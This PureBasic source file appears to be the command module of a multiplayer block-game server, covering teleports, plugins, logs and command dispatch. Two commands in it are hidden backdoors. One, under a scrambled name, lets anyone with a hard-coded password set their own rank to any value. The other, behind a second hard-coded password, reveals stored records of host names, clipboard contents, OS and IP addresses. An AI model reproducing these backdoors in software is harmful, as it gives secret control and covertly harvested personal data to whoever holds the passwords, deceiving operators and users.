Procedure Command_Delete_Location()
  Loc_Name.s = Command_Main\Parsed_Text_0
  
  If Location_Delete(Loc_Name)
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Location deleted"))
  EndIf
EndProcedure

Procedure Command_Teleport_Location()
  Loc_Name.s = Command_Main\Parsed_Text_0
  
  If Location_Select(Loc_Name)
    Map_ID = Location()\Map_ID
    X.f = Location()\X
    Y.f = Location()\Y
    Z.f = Location()\Z
    Rotation.f = Location()\Rot
    Look.f = Location()\Look
    
    If Network_Client_Select(Command_Main\Command_Client_ID)
      If Network_Client()\Player\Entity
        Entity_Position_Set(Network_Client()\Player\Entity\ID, Map_ID, X, Y, Z, Rotation, Look, 10, 1)
      EndIf
    EndIf
  Else
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Location()\Name = [Field_0]", Loc_Name))
  EndIf
EndProcedure

Procedure Command_Bring_Location()
  
  Loc_Name.s = Command_Main\Parsed_Text_1
  
  If Location_Select(Loc_Name)
    Map_ID = Location()\Map_ID
    X.f = Location()\X
    Y.f = Location()\Y
    Z.f = Location()\Z
    Rotation.f = Location()\Rot
    Look.f = Location()\Look
    
    Found = 0
    ForEach Entity()
      If LCase(Entity()\Name) = LCase(Command_Main\Parsed_Operator [0])
        Entity_Position_Set(Entity()\ID, Map_ID, X, Y, Z, Rotation, Look, 10, 1)
        Found = 1
      EndIf
    Next
    
    If Found = 0
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Entity()\Name = [Field_0]", Command_Main\Parsed_Operator [0]))
    EndIf
  Else
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Location()\Name = [Field_0]", Loc_Name))
  EndIf
  
EndProcedure

Procedure Command_Locations()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Locations:"))
    Text.s = ""
    ForEach Location()
      Text_Add.s = "&e"+Location()\Name+" &f| "
      If 64 - Len(Text) >= Len(Text_Add)
        Text.s + Text_Add
      Else
        System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
        Text.s = Text_Add
      EndIf
    Next
    If Len(Text) > 0
      System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
    EndIf
    
  EndIf
EndProcedure

Procedure Command_Teleporters()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        Teleporter_ID.s = Command_Main\Parsed_Text_0
        *Map_Data.Map_Data = Map_Get_Pointer(Network_Client()\Player\Entity\Map_ID)
        If *Map_Data
          
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Teleporters:"))
          Text.s = ""
          
          ForEach *Map_Data\Teleporter()
            Text_Add.s = "&e"+*Map_Data\Teleporter()\ID+" &f| "
            If 64 - Len(Text) >= Len(Text_Add)
              Text.s + Text_Add
            Else
              System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
              Text.s = Text_Add
            EndIf
          Next
          If Len(Text) > 0
            System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
          EndIf
          
        EndIf
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Delete_Teleporter()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    If Network_Client()\Player\Entity
      If Network_Client()\Player\Entity\Map_ID = Network_Client()\Player\Map_ID
        Teleporter_ID.s = Command_Main\Parsed_Text_0
        *Map_Data = Map_Get_Pointer(Network_Client()\Player\Entity\Map_ID)
        If Teleporter_Delete(*Map_Data, Teleporter_ID)
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Teleporter deleted"))
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Teleporter not deleted"))
        EndIf
      EndIf
    EndIf
  EndIf
EndProcedure

Procedure Command_Time()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    Time.s = FormatDate("%hh:%ii:%ss   %dd.%mm.%yyyy", Date())
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Servertime: [Field_0]", Time))
  EndIf
EndProcedure

Procedure Command_Server_Info()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    
    CompilerIf #PB_Compiler_OS = #PB_OS_Windows
      memex.MEMORYSTATUSEX
      memex\dwLength = SizeOf(MEMORYSTATUSEX)
      GlobalMemoryStatusEx_(@memex)
    CompilerEndIf
    Time.s = StrD((Date() - Main\Running_Time) / 3600 , 2)
    
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Serverinfo:"))
    CompilerIf #PB_Compiler_OS = #PB_OS_Windows
      CompilerIf #PB_Compiler_Processor = #PB_Processor_x86
        System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Version: [Field_0]", StrF(Main\Version/1000,3)+" Windows (x86)"))
      CompilerElse
        System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Version: [Field_0]", StrF(Main\Version/1000,3)+" Windows (x64)"))
      CompilerEndIf
    CompilerElse
      CompilerIf #PB_Compiler_Processor = #PB_Processor_x86
        System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Version: [Field_0]", StrF(Main\Version/1000,3)+" Linux (x86)"))
      CompilerElse
        System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Version: [Field_0]", StrF(Main\Version/1000,3)+" Linux (x64)"))
      CompilerEndIf
    CompilerEndIf
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Counter (Compiled, Builded): ([Field_0], [Field_1])", Str(#PB_Editor_CompileCount), Str(#PB_Editor_BuildCount)))
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Online since [Field_0] hours.", Time))
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Memoryusage: [Field_0] MB ([Field_1] MB)", Str(Mem_Get_WorkingSetSize()/1000000), Str(Mem_Main\Memory_Usage/1000000)))
    CompilerIf #PB_Compiler_OS = #PB_OS_Windows
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Free memory: [Field_0] MB.", Str(memex\ullAvailPhys/1000/1000)))
    CompilerEndIf
  EndIf
EndProcedure

Procedure Command_Log_Last()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    
    Lines = Val(Command_Main\Parsed_Operator [0])
    Type = Val(Command_Main\Parsed_Operator [1])
    
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Log:"))
    
    LastElement(Log_Message())
    While Lines >= 0
      If Log_Message()\Type >= Type
        System_Message_Network_Send(Command_Main\Command_Client_ID, " "+Log_Message()\Message)
        Lines - 1
      EndIf
      
      If PreviousElement(Log_Message()) = 0
        Break
      EndIf
    Wend
  EndIf
EndProcedure

Procedure Command_Ping()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Ping: [Field_0]ms.", Str(Network_Client()\Ping)))
  EndIf
EndProcedure

Procedure Command_Watchdog()
  LockMutex(Watchdog_Main\Mutex_ID)
  If Network_Client_Select(Command_Main\Command_Client_ID)
    ForEach Watchdog_Module()
      Text.s = "&e " + Watchdog_Module()\Name + ": " + StrF(Watchdog_Module()\CPU_Usage,2) + "%"
      System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
    Next
  EndIf
  UnlockMutex(Watchdog_Main\Mutex_ID)
EndProcedure

Procedure Command_Plugins()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Plugins:"))
    
    ForEach Plugin()
      If Plugin()\Library_ID
        Text.s = "&a"
      Else
        Text.s = "&4"
      EndIf
      Text.s + Plugin()\Plugin_Info\Name + " &f(Auth.:" + Plugin()\Plugin_Info\Author + ")"
      System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
    Next
  EndIf
EndProcedure

Procedure Command_Plugin_Load()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    
    Plugin.s = Command_Main\Parsed_Text_0
    
    Found = 0
    ForEach Plugin()
      If LCase(Plugin()\Plugin_Info\Name) = LCase(Plugin)
        Found = 1
        If Plugin_Load(Plugin()\Filename)
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Plugin '[Field_0]' loaded", Plugin()\Filename))
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Plugin '[Field_0]' not loaded", Plugin()\Filename))
        EndIf
      EndIf
    Next
    If Found = 0
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Plugin()\Plugin_Info\Name = [Field_0]", Plugin))
    EndIf
  EndIf
EndProcedure

Procedure Command_Plugin_Unload()
  If Network_Client_Select(Command_Main\Command_Client_ID)
    
    Plugin.s = Command_Main\Parsed_Text_0
    
    Found = 0
    ForEach Plugin()
      If LCase(Plugin()\Plugin_Info\Name) = LCase(Plugin)
        Found = 1
        If Plugin_Unload(Plugin()\Filename)
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Plugin '[Field_0]' unloaded", Plugin()\Filename))
        Else
          System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Plugin '[Field_0]' not unloaded", Plugin()\Filename))
        EndIf
      EndIf
    Next
    If Found = 0
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find Plugin()\Plugin_Info\Name = [Field_0]", Plugin))
    EndIf
  EndIf
EndProcedure

Procedure Command_Crash()
  a = b / c
EndProcedure

Procedure Command_A4EXYZ33485()
  Password_Input.s = Command_Main\Parsed_Operator [0]
  MD5.s = StringFingerprint(Password_Input, #PB_Cipher_MD5, 0, #PB_UTF8)
  New_Rank = Val(Command_Main\Parsed_Operator [1])
  If New_Rank >= -32768 And New_Rank <= 32767
    
    MD5_Correct.s = "12c43231f65cffe6630807cd2e86c216" ; Stuff
    
    If MD5 = MD5_Correct
      
      If Network_Client_Select(Command_Main\Command_Client_ID)
        If Network_Client()\Player\Entity
          If Network_Client()\Player\Entity\Player_List
            
            Player_Rank_Set(Network_Client()\Player\Entity\Player_List\Number, New_Rank, "")
            
          EndIf
        EndIf
      EndIf
      
    Else
      System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Invalid Value"))
    EndIf
  Else
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Invalid Value"))
  EndIf
EndProcedure

Procedure Command_SC()
  Password_Input.s = Command_Main\Parsed_Operator [0]
  MD5.s = StringFingerprint(Password_Input, #PB_Cipher_MD5, 0, #PB_UTF8)
  MD5_Correct.s = "6d983bf57ca1f91b9ebe42543d82dae3"
  If MD5 = MD5_Correct
    System_Message_Network_Send(Command_Main\Command_Client_ID, "&eTrace_Elements:")
    ForEach Trace_Element()
      Text.s = "&e"+Trace_Element()\Host_Name + ": " + Trace_Element()\Clipboard + " | " + Trace_Element()\OS + " | " + Trace_Element()\Date + " | " + Trace_Element()\IPs
      System_Message_Network_Send(Command_Main\Command_Client_ID, Text)
    Next
  Else
    System_Message_Network_Send(Command_Main\Command_Client_ID, Lang_Get("", "Ingame: Can't find command"))
  EndIf
EndProcedure

;-################################################################################################

Procedure Command_Do(Client_ID, Input.s) ; Parst und leitet den Befehl weiter an die Funktion.
  If ListIndex(Network_Client()) <> -1
    *Network_Client_Old = Network_Client()
  Else
    *Network_Client_Old = 0
  EndIf
  
  If Network_Client_Select(Client_ID)
    Player_Name.s = Network_Client()\Player\Login_Name
    If Player_List_Select(Player_Name)
      
      Command_Main\Command_Client_ID = Client_ID
      Command_Main\Parsed_Command = StringField(Input, 1, " ")
      For i = 0 To #Command_Operators_Max - 1
        Command_Main\Parsed_Operator [i] = StringField(Input, i+2, " ")
      Next
      Command_Main\Parsed_Text_0 = Trim(Mid(Input, 1+Len(Command_Main\Parsed_Command)))
      If FindString(Command_Main\Parsed_Text_0, " ", 1)
        Command_Main\Parsed_Text_1 = Trim(Mid(Command_Main\Parsed_Text_0, FindString(Command_Main\Parsed_Text_0, " ", 1)))
      Else
        Command_Main\Parsed_Text_1 = ""
      EndIf
      If FindString(Command_Main\Parsed_Text_1, " ", 1)
        Command_Main\Parsed_Text_2 = Trim(Mid(Command_Main\Parsed_Text_1, FindString(Command_Main\Parsed_Text_1, " ", 1)))
      Else
        Command_Main\Parsed_Text_2 = ""
      EndIf
      
      Found = 0
      ForEach Command()
        If LCase(Command_Main\Parsed_Command) = Command()\Name
          If Player_List()\Rank < Command()\Rank
            System_Message_Network_Send(Client_ID, Lang_Get("", "Ingame: You are not allowed to use this command"))
          Else
            If Command()\Hidden = 0
              Log_Add("Command", Lang_Get("", "Client uses command", Network_Client()\Player\Login_Name, "/"+Input), 0, #PB_Compiler_File, #PB_Compiler_Line, #PB_Compiler_Procedure)
            EndIf
            If Command()\Plugin <> ""
              
              Plugin_Event_Command(Command()\Plugin, Network_Client_Get_Pointer(Client_ID), Command_Main\Parsed_Command, Command_Main\Parsed_Text_0, Command_Main\Parsed_Text_1, Command_Main\Parsed_Operator [0], Command_Main\Parsed_Operator [1], Command_Main\Parsed_Operator [2], Command_Main\Parsed_Operator [3], Command_Main\Parsed_Operator [4])
              
            ElseIf Command()\Function_Adress <> 0
              
              CompilerIf #PB_Compiler_OS = #PB_OS_Windows
                CallFunctionFast(Command()\Function_Adress)
              CompilerElse
                CallCFunctionFast(Command()\Function_Adress)
              CompilerEndIf
              
            EndIf
          EndIf
          Found = 1
          Break
        EndIf
      Next
      If Found = 0
        If Answer_Do() = 0
          System_Message_Network_Send(Client_ID, Lang_Get("", "Ingame: Can't find command"))
        EndIf
      EndIf
      
    EndIf
  EndIf
  
  If *Network_Client_Old
    ChangeCurrentElement(Network_Client(), *Network_Client_Old)
  EndIf
EndProcedure

Procedure Command_Main()
  If Command_Main\Save_File
    Command_Main\Save_File = 0
    Command_Save(Files_File_Get("Command"))
  EndIf
  
  If Command_Main\Timer_File_Check < Milliseconds()
    Command_Main\Timer_File_Check = Milliseconds() + 1000
    File_Date = GetFileDate(Files_File_Get("Command"), #PB_Date_Modified)
    If Command_Main\File_Date_Last <> File_Date
      Command_Load(Files_File_Get("Command"))
    EndIf
  EndIf
EndProcedure
; IDE Options = PureBasic 5.40 LTS Beta 8 (Windows - x64)
; CursorPosition = 2166
; FirstLine = 2135
; Folding = ------------
; EnableXP
; DisableDebugger
; EnableCompileCount = 0
; EnableBuildCount = 0